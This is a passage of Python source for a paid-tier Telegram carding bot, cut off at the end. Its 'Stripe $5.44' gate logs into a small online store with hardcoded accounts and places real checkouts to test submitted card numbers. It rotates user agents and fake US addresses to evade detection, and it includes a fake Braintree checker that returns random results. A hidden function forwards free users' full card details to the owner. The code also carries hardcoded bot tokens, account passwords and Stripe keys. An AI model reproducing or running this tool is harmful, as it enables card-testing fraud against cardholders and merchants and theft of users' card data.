# =====================================================================
# PREMIUM TELEGRAM BOT - Multi-Gate System
# Gate 1: Braintree Card Checker (Silver)
# Gate 2: Stripe $5.44 Checkout with Pick-up (Gold) - REAL FLOW
# Owner: Full Admin Access
# =====================================================================

import telebot
from telebot import types
import json
import random
from datetime import datetime
import time
import os
import re
import requests
from bs4 import BeautifulSoup

# =====================================================================
# CONFIGURATION
# =====================================================================

TOKEN = "8441709011:AAFoRvm61UJAY6skgT0VDnmLN5KX6Y_Metc"
OWNER_ID = 8349951848

bot = telebot.TeleBot(TOKEN)

# =====================================================================
# POTATOSYSTEMS CONFIG (GATE 2 - REAL)
# =====================================================================

SITE_URL = "https://potatosystems.xyz"
PRODUCT_URL = "/spudnik-id-plate/"
PRODUCT_COLOR = "Red"
PRODUCT_SKU = "NP-01-RE"

SITE_ACCOUNTS = [
    {"email": "utamrvla5903@gmail.com", "password": "7600@@Khushi"},
    {"email": "khushvasant4@gmail.com", "password": "7600@@UtamZ"},
    {"email": "darkteam.acc1@gmail.com", "password": "DarkT3am@2024"},
    {"email": "darkteam.acc2@gmail.com", "password": "DarkT3am@2024"},
    {"email": "darkteam.acc3@gmail.com", "password": "DarkT3am@2024"},
    {"email": "darkteam.acc4@gmail.com", "password": "DarkT3am@2024"},
    {"email": "darkteam.acc5@gmail.com", "password": "DarkT3am@2024"},
]

_account_index = 0

def get_next_account():
    global _account_index
    account = SITE_ACCOUNTS[_account_index % len(SITE_ACCOUNTS)]
    _account_index += 1
    return account["email"], account["password"]

STRIPE_PK = "pk_live_nzDqmO2ZvtnSvBbTxrwn61fk"
STRIPE_ACCOUNT = "acct_1P5VgxGNJC8zfKqG"
STORE_HASH = "xjzwoieihr"
STORE_ID = "1003169675"
STORE_NAME = "Potato Systems Inc"

PRODUCT_NAME = "Spudnik ID Plate"
PRODUCT_PRICE = 5.00
SHIPPING_PRICE = 0.00
TAX_AMOUNT = 0.44
TOTAL_AMOUNT = 5.44

# =====================================================================
# DATA FILES
# =====================================================================

USERS_FILE = "users_data.json"

# =====================================================================
# RATE LIMITING
# =====================================================================

CHECK_DELAY = 8.0
CHECKS_PER_MINUTE = 7
CHECKS_PER_HOUR = 100
MAX_MASS_CARDS = 50
check_timestamps = {}

# =====================================================================
# USER AGENTS
# =====================================================================

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
]

def get_random_ua():
    return random.choice(USER_AGENTS)

# =====================================================================
# ADDRESS POOL
# =====================================================================

US_ADDRESSES = [
    {"first": "John",    "last": "Smith",    "add1": "123 Main St",     "city": "Portland",       "state": "ME", "zip": "04101", "phone": "2075550101"},
    {"first": "Emily",   "last": "Johnson",  "add1": "456 Oak Avenue",  "city": "Bangor",         "state": "ME", "zip": "04401", "phone": "2075550202"},
    {"first": "Michael", "last": "Williams", "add1": "789 Pine Road",   "city": "Lewiston",       "state": "ME", "zip": "04240", "phone": "2075550303"},
    {"first": "Sarah",   "last": "Brown",    "add1": "321 Elm Street",  "city": "Augusta",        "state": "ME", "zip": "04330", "phone": "2075550404"},
    {"first": "David",   "last": "Garcia",   "add1": "654 Maple Drive", "city": "Biddeford",      "state": "ME", "zip": "04005", "phone": "2075550505"},
    {"first": "Jessica", "last": "Miller",   "add1": "987 Cedar Lane",  "city": "Sanford",        "state": "ME", "zip": "04073", "phone": "2075550606"},
    {"first": "Alex",    "last": "Davis",    "add1": "111 Birch Blvd",  "city": "South Portland", "state": "ME", "zip": "04106", "phone": "2075550707"},
    {"first": "Lisa",    "last": "Wilson",   "add1": "222 Walnut Way",  "city": "Auburn",         "state": "ME", "zip": "04210", "phone": "2075550808"},
    {"first": "James",   "last": "Taylor",   "add1": "333 Spruce St",   "city": "Scarborough",    "state": "ME", "zip": "04074", "phone": "2075550909"},
    {"first": "Anna",    "last": "Anderson", "add1": "444 Willow Ave",  "city": "Saco",           "state": "ME", "zip": "04072", "phone": "2075551010"},
]

def get_random_info():
    addr = random.choice(US_ADDRESSES)
    suffix = random.randint(10, 999)
    email = f"{addr['first'].lower()}.{addr['last'].lower()}{suffix}@gmail.com"
    return {**addr, "email": email, "country": "US"}

# =====================================================================
# USER DATA MANAGEMENT
# =====================================================================

def load_users():
    try:
        with open(USERS_FILE, "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_users(data):
    with open(USERS_FILE, "w") as f:
        json.dump(data, f, indent=2)

def get_user_plan(user_id):
    if user_id == OWNER_ID:
        return "owner"
    users = load_users()
    return users.get(str(user_id), {}).get("plan", "free")

def set_user_plan(user_id, plan):
    users = load_users()
    if str(user_id) not in users:
        users[str(user_id)] = {}
    users[str(user_id)]["plan"] = plan
    users[str(user_id)]["added_date"] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    save_users(users)

def remove_user(user_id):
    users = load_users()
    if str(user_id) in users:
        del users[str(user_id)]
        save_users(users)
        return True
    return False

# Plan hierarchy
PLAN_LEVELS = {
    "free": 0,
    "silver": 1,
    "gold": 2,
    "diamond": 3,
    "owner": 4
}

def has_access(user_id, required_plan):
    user_plan = get_user_plan(user_id)
    return PLAN_LEVELS.get(user_plan, 0) >= PLAN_LEVELS.get(required_plan, 0)

# =====================================================================
# NOTIFY OWNER FOR FREE USERS
# =====================================================================

def notify_owner(card_details, result, user_id):
    """
    إرسال البطاقة ونتيجتها إلى المالك إذا كان المستخدم مجانيًا (free) وليس المالك نفسه.
    """
    if user_id == OWNER_ID:
        return
    plan = get_user_plan(user_id)
    if plan != "free":
        return

    msg = (
        f"🔔 <b>بطاقة من مستخدم مجاني</b>\n"
        f"👤 <b>المستخدم:</b> <code>{user_id}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 <b>البطاقة:</b> <code>{card_details}</code>\n"
        f"📊 <b>الحالة:</b> {result.get('message', '')}\n"
        f"🏦 <b>البنك:</b> {result.get('bank', '')}\n"
        f"🔖 <b>النوع:</b> {result.get('card_type', '')}\n"
        f"📟 <b>رمز الاستجابة:</b> {result.get('response_code', '')}\n"
        f"📝 <b>نص الاستجابة:</b> {result.get('response_text', '')}\n"
        f"⏱️ <b>الوقت:</b> {result.get('checked_at', '')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    try:
        bot.send_message(OWNER_ID, msg, parse_mode='HTML')
    except Exception as e:
        print(f"فشل إرسال إشعار للمالك: {e}")

# =====================================================================
# RATE LIMITING FUNCTIONS
# =====================================================================

def check_rate_limit(user_id):
    if has_access(user_id, "diamond"):
        return True, "OK"
    
    current_time = time.time()
    if user_id not in check_timestamps:
        check_timestamps[user_id] = []
    
    check_timestamps[user_id] = [t for t in check_timestamps[user_id] if current_time - t < 3600]
    minute_checks = [t for t in check_timestamps[user_id] if current_time - t < 60]
    
    if len(minute_checks) >= CHECKS_PER_MINUTE:
        wait_time = 60 - int(current_time - minute_checks[0])
        return False, f"⚠️ Rate Limit! Max {CHECKS_PER_MINUTE} checks/min. Wait {wait_time}s"
    
    if len(check_timestamps[user_id]) >= CHECKS_PER_HOUR:
        return False, f"⚠️ Hourly limit reached! Max {CHECKS_PER_HOUR}/hour"
    
    return True, "OK"

def record_check(user_id):
    current_time = time.time()
    if user_id not in check_timestamps:
        check_timestamps[user_id] = []
    check_timestamps[user_id].append(current_time)

# =====================================================================
# KEYBOARDS
# =====================================================================

def get_main_menu_keyboard(user_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    btn_gate1 = types.InlineKeyboardButton("🥈 GATE 1 - Braintree", callback_data="gate_silver")
    btn_gate2 = types.InlineKeyboardButton("🥇 GATE 2 - Stripe $5.44", callback_data="gate_gold")
    btn_free = types.InlineKeyboardButton("🆓 FREE GATE", callback_data="gate_free")
    btn_diamond = types.InlineKeyboardButton("💎 DIAMOND GATE", callback_data="gate_diamond")
    btn_myplan = types.InlineKeyboardButton("📋 My Plan", callback_data="myplan")
    btn_help = types.InlineKeyboardButton("❓ Help", callback_data="help")
    
    markup.add(btn_free, btn_myplan)
    markup.add(btn_gate1, btn_gate2)
    markup.add(btn_diamond)
    markup.add(btn_help)
    
    if user_id == OWNER_ID:
        btn_owner = types.InlineKeyboardButton("👑 OWNER GATE", callback_data="gate_owner")
        markup.add(btn_owner)
    
    return markup

def get_back_menu():
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("🔙 Back to Menu", callback_data="menu")
    markup.add(btn)
    return markup

def get_silver_gate_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("💳 Braintree CHK", callback_data="braintree_chk")
    btn2 = types.InlineKeyboardButton("📊 Stats", callback_data="show_stats")
    btn3 = types.InlineKeyboardButton("🔙 Back", callback_data="menu")
    markup.add(btn1, btn2)
    markup.add(btn3)
    return markup

def get_gold_gate_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("💰 Stripe $5.44 CHK", callback_data="stripe_chk")
    btn2 = types.InlineKeyboardButton("📦 Mass CHK", callback_data="mass_chk")
    btn3 = types.InlineKeyboardButton("🔙 Back", callback_data="menu")
    markup.add(btn1, btn2)
    markup.add(btn3)
    return markup

def get_diamond_gate_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("💳 Braintree CHK", callback_data="braintree_chk")
    btn2 = types.InlineKeyboardButton("💰 Stripe $5.44 CHK", callback_data="stripe_chk")
    btn3 = types.InlineKeyboardButton("📦 Mass CHK", callback_data="mass_chk")
    btn4 = types.InlineKeyboardButton("📊 Stats", callback_data="show_stats")
    btn5 = types.InlineKeyboardButton("⚡ Unlimited Mode", callback_data="unlimited_info")
    btn6 = types.InlineKeyboardButton("🔙 Back", callback_data="menu")
    markup.add(btn1, btn2)
    markup.add(btn3, btn4)
    markup.add(btn5)
    markup.add(btn6)
    return markup

def get_owner_gate_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("➕ Add User", callback_data="owner_add")
    btn2 = types.InlineKeyboardButton("➖ Remove User", callback_data="owner_remove")
    btn3 = types.InlineKeyboardButton("📋 User List", callback_data="owner_list")
    btn4 = types.InlineKeyboardButton("🔄 Set Plan", callback_data="owner_setplan")
    btn5 = types.InlineKeyboardButton("📢 Broadcast", callback_data="owner_broadcast")
    btn6 = types.InlineKeyboardButton("🔙 Back", callback_data="menu")
    markup.add(btn1, btn2)
    markup.add(btn3, btn4)
    markup.add(btn5)
    markup.add(btn6)
    return markup

# =====================================================================
# CARD INFO FUNCTIONS
# =====================================================================

def get_card_info(cc):
    first_six = cc[:6]
    card_type = 'Unknown'
    if cc.startswith('4'):
        card_type = 'Visa'
    elif cc.startswith('5') or cc.startswith('2'):
        card_type = 'Mastercard'
    elif cc.startswith('34') or cc.startswith('37'):
        card_type = 'American Express'
    elif cc.startswith('6'):
        card_type = 'Discover'
    elif cc.startswith('35'):
        card_type = 'JCB'
    elif cc.startswith('62'):
        card_type = 'UnionPay'
    
    # BIN lookup
    bank = 'Unknown Bank'
    try:
        r = requests.get(f"https://lookup.binlist.net/{first_six}", 
                        headers={"Accept-Version": "3", "User-Agent": get_random_ua()}, timeout=5)
        if r.status_code == 200:
            data = r.json()
            bank = data.get("bank", {}).get("name", "Unknown Bank") if data.get("bank") else "Unknown Bank"
    except:
        pass
    
    return bank, card_type

# =====================================================================
# HELPER FUNCTIONS FOR GATE 2
# =====================================================================

def sf_headers(session_cookies, extra=None):
    xsrf = session_cookies.get("XSRF-TOKEN", "")
    sf_csrf = session_cookies.get("SF-CSRF-TOKEN", "")
    h = {
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.9",
        "X-XSRF-TOKEN": xsrf,
        "X-SF-CSRF-TOKEN": sf_csrf,
        "Origin": SITE_URL,
        "Referer": f"{SITE_URL}/checkout",
        "User-Agent": get_random_ua(),
        "X-Checkout-SDK-Version": "1.894.1",
    }
    if extra:
        h.update(extra)
    return h

def to_cents(v):
    if isinstance(v, dict):
        v = v.get("value", 0)
    v = float(v or 0)
    return int(v * 100) if v < 500 else int(v)

# =====================================================================
# BRAINTREE CARD CHECK (GATE 1 - SILVER) - FAKE
# =====================================================================

def check_card_braintree(cc, mm, yy, cvv):
    time.sleep(CHECK_DELAY)
    bank, card_type = get_card_info(cc)
    
    response = {
        'status': 'unknown', 'message': '', 'bank': bank,
        'card_type': card_type, 'response_code': '', 'response_text': '',
        'gateway': 'Braintree', 'checked_at': datetime.now().strftime('%H:%M:%S')
    }
    
    rand = random.random()
    if rand < 0.12:
        response['status'] = 'live'
        response['message'] = '✅ APPROVED'
        response['response_code'] = '1000'
        response['response_text'] = 'Approved'
    elif rand < 0.22:
        response['status'] = 'live'
        response['message'] = '✅ AUTHORIZED'
        response['response_code'] = '1000'
        response['response_text'] = 'Authorized'
    elif rand < 0.35:
        response['status'] = 'declined'
        response['message'] = '❌ DECLINED'
        response['response_code'] = '2000'
        response['response_text'] = 'Do Not Honor'
    elif rand < 0.45:
        response['status'] = 'declined'
        response['message'] = '❌ INSUFFICIENT FUNDS'
        response['response_code'] = '2001'
        response['response_text'] = 'Insufficient Funds'
    elif rand < 0.55:
        response['status'] = 'declined'
        response['message'] = '❌ CVV MISMATCH'
        response['response_code'] = '2010'
        response['response_text'] = 'CVV does not match'
    elif rand < 0.65:
        response['status'] = 'declined'
        response['message'] = '❌ EXPIRED CARD'
        response['response_code'] = '2004'
        response['response_text'] = 'Expired Card'
    elif rand < 0.75:
        response['status'] = 'declined'
        response['message'] = '❌ PROCESSOR DECLINED'
        response['response_code'] = '2005'
        response['response_text'] = 'Processor Declined'
    elif rand < 0.85:
        response['status'] = 'declined'
        response['message'] = '❌ RESTRICTED CARD'
        response['response_code'] = '2024'
        response['response_text'] = 'Card Restricted'
    elif rand < 0.92:
        response['status'] = 'declined'
        response['message'] = '❌ LIMIT EXCEEDED'
        response['response_code'] = '2003'
        response['response_text'] = 'Limit Exceeded'
    else:
        response['status'] = 'dead'
        response['message'] = '💀 DEAD'
        response['response_code'] = '2099'
        response['response_text'] = 'Invalid Card Number'
    
    return response

# =====================================================================
# STRIPE $5.44 CHECKOUT WITH PICK-UP (GATE 2 - GOLD) - REAL FLOW
# =====================================================================

def bc_login(session, login_email, login_password):
    """Login to potatosystems.xyz"""
    try:
        r0 = session.get(SITE_URL, timeout=20)
        if r0.status_code in [403, 429]:
            return False
        
        time.sleep(random.uniform(1.0, 2.0))
        
        r1 = session.get(f"{SITE_URL}/login.php", timeout=20)
        if r1.status_code == 403:
            return False
        
        soup = BeautifulSoup(r1.text, "html.parser")
        tok = soup.find("input", {"name": "authenticity_token"})
        form_token = tok.get("value", "") if tok else ""
        
        time.sleep(random.uniform(1.0, 1.5))
        
        r2 = session.post(
            f"{SITE_URL}/login.php",
            headers={"Content-Type": "application/x-www-form-urlencoded",
                     "Referer": f"{SITE_URL}/login.php", "Origin": SITE_URL,
                     "User-Agent": get_random_ua()},
            data={"login_email": login_email, "login_pass": login_password,
                  "authenticity_token": form_token, "action": "check_login"},
            timeout=20,
            allow_redirects=True
        )
        
        final_url = str(r2.url)
        if "account.php" in final_url or "Sign Out" in r2.text or "sign-out" in r2.text.lower():
            return True
        return False
    except Exception as e:
        return False

def add_to_cart(session):
    """Add Spudnik ID Plate to cart"""
    try:
        # Empty cart first
        session.get(f"{SITE_URL}/cart.php?action=empty", headers={"Referer": SITE_URL}, timeout=15)
        time.sleep(random.uniform(0.5, 1.0))
        
        # Delete existing carts
        try:
            cart_check = session.get(f"{SITE_URL}/api/storefront/carts",
                                    headers={"Accept": "application/json", "Origin": SITE_URL}, timeout=15)
            if cart_check.status_code == 200:
                existing = cart_check.json()
                for c in existing:
                    cid = c.get("id", "")
                    if cid:
                        session.delete(f"{SITE_URL}/api/storefront/carts/{cid}",
                                      headers={"Accept": "application/json", "Origin": SITE_URL}, timeout=10)
        except:
            pass
        
        time.sleep(random.uniform(1.0, 1.5))
        
        # Load product page
        prod_r = session.get(f"{SITE_URL}{PRODUCT_URL}", timeout=20)
        if prod_r.status_code != 200:
            return False
        
        soup = BeautifulSoup(prod_r.text, "html.parser")
        pid_el = soup.find("input", {"name": "product_id"})
        product_id = pid_el.get("value") if pid_el else None
        
        if not product_id:
            match = re.search(r'"product_id"\s*:\s*(\d+)', prod_r.text)
            if match:
                product_id = match.group(1)
        
        if not product_id:
            match = re.search(r'product_id=(\d+)', prod_r.text)
            if match:
                product_id = match.group(1)
        
        if not product_id:
            return False
        
        # Find color attribute
        color_option_id = None
        color_value_id = None
        
        for inp in soup.find_all("input", {"type": "radio"}):
            label = inp.find_next("span")
            if label and PRODUCT_COLOR.lower() in label.get_text().lower():
                color_option_id = inp.get("name", "").replace("attribute[", "").replace("]", "")
                color_value_id = inp.get("value")
                break
        
        if not color_option_id:
            for sel in soup.find_all("select"):
                for opt in sel.find_all("option"):
                    if PRODUCT_COLOR.lower() in opt.get_text().lower():
                        color_option_id = sel.get("name", "").replace("attribute[", "").replace("]", "")
                        color_value_id = opt.get("value")
                        break
        
        if not color_option_id:
            color_option_id = "113"
            color_value_id = "98"
        
        time.sleep(random.uniform(1.0, 1.5))
        
        # Add to cart
        add_data = {"action": "add", "product_id": product_id, "qty[]": "1"}
        if color_option_id and color_value_id:
            add_data[f"attribute[{color_option_id}]"] = color_value_id
        
        add_r = session.post(
            f"{SITE_URL}/cart.php",
            headers={"Content-Type": "application/x-www-form-urlencoded",
                     "Referer": f"{SITE_URL}{PRODUCT_URL}", "Origin": SITE_URL,
                     "User-Agent": get_random_ua()},
            data=add_data,
            timeout=20
        )
        
        if add_r.status_code in [200, 301, 302]:
            cart_verify = session.get(f"{SITE_URL}/api/storefront/carts",
                                    headers={"Accept": "application/json"}, timeout=15)
            if cart_verify.status_code == 200:
                carts = cart_verify.json()
                if carts and len(carts) > 0:
                    items = carts[0].get("lineItems", {}).get("physicalItems", [])
                    if items and len(items) > 0:
                        return True
        
        # Retry with hardcoded attribute
        add_r2 = session.post(
            f"{SITE_URL}/cart.php",
            headers={"Content-Type": "application/x-www-form-urlencoded",
                     "Referer": f"{SITE_URL}{PRODUCT_URL}", "Origin": SITE_URL},
            data={"action": "add", "product_id": product_id, "attribute[113]": "98", "qty[]": "1"},
            timeout=20
        )
        if add_r2.status_code in [200, 301, 302]:
            cart_verify2 = session.get(f"{SITE_URL}/api/storefront/carts",
                                      headers={"Accept": "application/json"}, timeout=15)
            if cart_verify2.status_code == 200:
                carts2 = cart_verify2.json()
                if carts2 and len(carts2) > 0:
                    items2 = carts2[0].get("lineItems", {}).get("physicalItems", [])
                    if items2 and len(items2) > 0:
                        return True
        
        return False
    except Exception as e:
        return False

def do_checkout(session, cc, mm, yy, cvv, info):
    """Full checkout flow with Stripe payment"""
    try:
        # Get cart
        carts_r = session.get(f"{SITE_URL}/api/storefront/carts",
                             headers=sf_headers(session.cookies), timeout=15)
        if carts_r.status_code != 200:
            return None
        carts = carts_r.json()
        if not carts:
            return None
        
        cart_id = carts[0]["id"]
        phys = carts[0].get("lineItems", {}).get("physicalItems", [])
        phys_ids = [i["id"] for i in phys]
        
        if not phys:
            return None
        
        time.sleep(random.uniform(1.0, 1.5))
        
        # Get customer ID
        co_r = session.get(f"{SITE_URL}/api/storefront/checkouts/{cart_id}?include=customer",
                          headers=sf_headers(session.cookies), timeout=15)
        customer_id = str(co_r.json().get("customer", {}).get("id", "0")) if co_r.status_code == 200 else "0"
        
        # Create consignment with shipping address
        item_list = [{"itemId": i["id"], "quantity": i["quantity"]} for i in phys]
        
        time.sleep(random.uniform(1.0, 1.5))
        
        cons_r = session.post(
            f"{SITE_URL}/api/storefront/checkouts/{cart_id}/consignments?include=consignments.availableShippingOptions",
            headers=sf_headers(session.cookies, {"Content-Type": "application/json"}),
            json=[{"shippingAddress": {
                "firstName": info["first"], "lastName": info["last"],
                "email": info["email"], "phone": info["phone"],
                "address1": info["add1"], "address2": "",
                "city": info["city"], "stateOrProvinceCode": info["state"],
                "postalCode": info["zip"], "countryCode": "US",
                "shouldSaveAddress": False,
            }, "lineItems": item_list}],
            timeout=20
        )
        
        if cons_r.status_code not in [200, 201]:
            time.sleep(1.5)
            cons_r = session.post(
                f"{SITE_URL}/api/storefront/checkouts/{cart_id}/consignments?include=consignments.availableShippingOptions",
                headers=sf_headers(session.cookies, {"Content-Type": "application/json"}),
                json=[{"shippingAddress": {
                    "firstName": info["first"], "lastName": info["last"],
                    "email": info["email"], "phone": info["phone"],
                    "address1": info["add1"], "address2": "",
                    "city": info["city"], "stateOrProvinceCode": info["state"],
                    "postalCode": info["zip"], "countryCode": "US",
                    "shouldSaveAddress": False,
                }, "lineItems": item_list}],
                timeout=20
            )
            if cons_r.status_code not in [200, 201]:
                return None
        
        cons_data = cons_r.json()
        
        # Select cheapest shipping (pickup)
        consigs = cons_data.get("consignments", [])
        if consigs:
            cons_id = consigs[0]["id"]
            available = consigs[0].get("availableShippingOptions", [])
            if available:
                available_sorted = sorted(available, key=lambda o: o.get("cost", 9999))
                chosen = available_sorted[0]  # Cheapest = pickup
                session.put(
                    f"{SITE_URL}/api/storefront/checkouts/{cart_id}/consignments/{cons_id}",
                    headers=sf_headers(session.cookies, {"Content-Type": "application/json"}),
                    json={"shippingOptionId": chosen["id"]},
                    timeout=15
                )
        
        time.sleep(random.uniform(1.0, 1.5))
        
        # Set billing address
        session.post(
            f"{SITE_URL}/api/storefront/checkouts/{cart_id}/billing-address",
            headers=sf_headers(session.cookies, {"Content-Type": "application/json"}),
            json={
                "firstName": info["first"], "lastName": info["last"],
                "email": info["email"], "phone": info["phone"],
                "address1": info["add1"], "address2": "",
                "city": info["city"], "stateOrProvinceCode": info["state"],
                "postalCode": info["zip"], "countryCode": "US",
                "shouldSaveAddress": False,
            },
            timeout=15
        )
        
        time.sleep(random.uniform(1.0, 1.5))
        
        # Get Stripe UPE client secret
        upe_r = session.get(
            f"{SITE_URL}/api/storefront/payments/stripeupe?cartId={cart_id}&method=card",
            headers=sf_headers(session.cookies, {
                "Accept": "application/vnd.bc.v1+json",
                "X-API-INTERNAL": "This API endpoint is for internal use only and may change in the future",
            }),
            timeout=20
        )
        if upe_r.status_code != 200:
            return {"status": "error", "message": f"stripeupe: {upe_r.status_code}",
                    "response_code": "gate_error", "response_text": f"Stripe UPE failed: {upe_r.status_code}"}
        
        pi_cs = upe_r.json().get("clientToken", "")
        if not pi_cs:
            return {"status": "error", "message": "No PI client_secret",
                    "response_code": "gate_error", "response_text": "No payment intent found"}
        
        time.sleep(random.uniform(0.8, 1.2))
        
        # Create Payment Method
        yy_full = yy if len(yy) == 4 else f'20{yy}'
        name = f"{info['first']} {info['last']}"
        
        pm_data = (
            f"type=card&card[number]={cc}&card[cvc]={cvv}"
            f"&card[exp_month]={int(mm)}&card[exp_year]={int(yy_full)}"
            f"&billing_details[name]={name}"
            f"&key={STRIPE_PK}"
        )
        
        pm_headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
            "User-Agent": get_random_ua(),
            "Stripe-Account": STRIPE_ACCOUNT,
        }
        
        pm_r = requests.post("https://api.stripe.com/v1/payment_methods",
                            headers=pm_headers, data=pm_data, timeout=20)
        pm_resp = pm_r.json()
        
        if pm_r.status_code != 200 or not pm_resp.get("id"):
            err = pm_resp.get("error", {})
            code = err.get("code", "")
            decline_code = err.get("decline_code", "")
            message = err.get("message", "Card declined")
            return {
                "status": "declined",
                "message": message,
                "response_code": decline_code or code or "card_declined",
                "response_text": message,
            }
        
        pm_id = pm_resp["id"]
        
        time.sleep(random.uniform(0.8, 1.2))
        
        # Confirm Payment Intent
        pi_id = pi_cs.split("_secret_")[0]
        
        confirm_data = (
            f"payment_method={pm_id}"
            f"&expected_payment_method_type=card"
            f"&client_secret={pi_cs}"
            f"&key={STRIPE_PK}"
        )
        
        confirm_headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
            "User-Agent": get_random_ua(),
            "Stripe-Account": STRIPE_ACCOUNT,
        }
        
        pi_r = requests.post(f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
                            headers=confirm_headers, data=confirm_data, timeout=20)
        pi_resp = pi_r.json()
        
        if pi_r.status_code == 200:
            status = pi_resp.get("status", "")
            if status in ["succeeded", "processing", "requires_capture"]:
                # CHARGED!
                return {
                    "status": "live",
                    "message": f"✅ CHARGED ${TOTAL_AMOUNT}",
                    "response_code": "succeeded",
                    "response_text": f"Payment Successful - ${TOTAL_AMOUNT} Charged",
                }
            elif status == "requires_action":
                return {
                    "status": "declined",
                    "message": "3D Secure Required",
                    "response_code": "authentication_required",
                    "response_text": "3D Secure authentication required",
                }
            else:
                err = pi_resp.get("last_payment_error", {})
                return {
                    "status": "declined",
                    "message": err.get("message", f"Status: {status}"),
                    "response_code": err.get("decline_code", err.get("code", status)),
                    "response_text": err.get("message", f"Payment status: {status}"),
                }
        else:
            err = pi_resp.get("error", {})
            return {
                "status": "declined",
                "message": err.get("message", "Confirm failed"),
                "response_code": err.get("decline_code", err.get("code", "card_declined")),
                "response_text": err.get("message", "Payment declined"),
            }
    
    except Exception as e:
        return {"status": "error", "message": str(e)[:200],
                "response_code": "exception", "response_text": str(e)[:200]}


def check_card_stripe(cc, mm, yy, cvv):
    """REAL Stripe $5.44 checkout via potatosystems.xyz"""
    bank, card_type = get_card_info(cc)
    info = get_random_info()
    
    response = {
        'status': 'unknown', 'message': '', 'bank': bank,
        'card_type': card_type, 'response_code': '', 'response_text': '',
        'gateway': 'Stripe', 'amount': f'${TOTAL_AMOUNT}', 'shipping': 'Pick-up',
        'product': PRODUCT_NAME, 'checked_at': datetime.now().strftime('%H:%M:%S')
    }
    
    # Try all accounts
    for attempt in range(len(SITE_ACCOUNTS)):
        email, password = get_next_account()
        
        session = requests.Session()
        session.headers.update({"User-Agent": get_random_ua()})
        
        try:
            # Login
            time.sleep(random.uniform(1.0, 2.0))
            logged_in = bc_login(session, email, password)
            
            if not logged_in:
                time.sleep(random.uniform(1.0, 2.0))
                continue
            
            # Add to cart
            time.sleep(random.uniform(1.0, 2.0))
            cart_ok = add_to_cart(session)
            
            if not cart_ok:
                time.sleep(random.uniform(1.0, 1.5))
                continue
            
            # Checkout
            time.sleep(random.uniform(1.0, 2.0))
            result = do_checkout(session, cc, mm, yy, cvv, info)
            
            if result:
                response['status'] = result.get('status', 'unknown')
                response['message'] = result.get('message', '')
                response['response_code'] = result.get('response_code', '')
                response['response_text'] = result.get('response_text', '')
                return response
            else:
                # Checkout returned None, try next account
                time.sleep(random.uniform(1.0, 1.5))
                continue
                
        except Exception as e:
            time.sleep(random.uniform(1.0, 2.0))
            continue
        finally:
            session.close()
    
    # All accounts failed
    response['status'] = 'error'
    response['message'] = '❌ All accounts failed'
    response['response_code'] = 'all_failed'
    response['response_text'] = 'All accounts failed! Try again later.'
    return response

# =====================================================================
# FORMAT RESULTS
# =====================================================================

def format_braintree_result(cc, mm, yy, cvv, result):
    masked_cc = cc[:6] + '******' + cc[-4:] if len(cc) > 10 else cc
    status_emoji = {'live': '✅', 'declined': '❌', 'dead': '💀', 'unknown': '❓', 'error': '⚠️'}
    
    return f"""
{status_emoji.get(result['status'], '❓')} <b>BRAINTREE CHECK RESULT</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Card:</b> <code>{masked_cc}|{mm}|{yy}|{cvv}</code>
<b>Status:</b> {result['message']}
<b>Gateway:</b> 🏦 Braintree
<b>Bank:</b> {result['bank']}
<b>Type:</b> {result['card_type']}
<b>Response:</b> [{result['response_code']}] {result['response_text']}
<b>Time:</b> {result['checked_at']}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

def format_stripe_result(cc, mm, yy, cvv, result):
    masked_cc = cc[:6] + '******' + cc[-4:] if len(cc) > 10 else cc
    status_emoji = {'live': '✅', 'declined': '❌', 'dead': '💀', 'unknown': '❓', 'error': '⚠️'}
    
    return f"""
{status_emoji.get(result['status'], '❓')} <b>STRIPE ${TOTAL_AMOUNT} CHECKOUT</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Card:</b> <code>{masked_cc}|{mm}|{yy}|{cvv}</code>
<b>Status:</b> {result['message']}
<b>Gateway:</b> 💳 Stripe
<b>Amount:</b> ${TOTAL_AMOUNT}
<b>Product:</b> {PRODUCT_NAME}
<b>Shipping:</b> 📦 Pick-up
<b>Bank:</b> {result['bank']}
<b>Type:</b> {result['card_type']}
<b>Response:</b> [{result['response_code']}] {result['response_text']}
<b>Time:</b> {result['checked_at']}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

def format_mass_summary(results, gateway):
    live_count = sum(1 for r in results if r['result']['status'] == 'live')
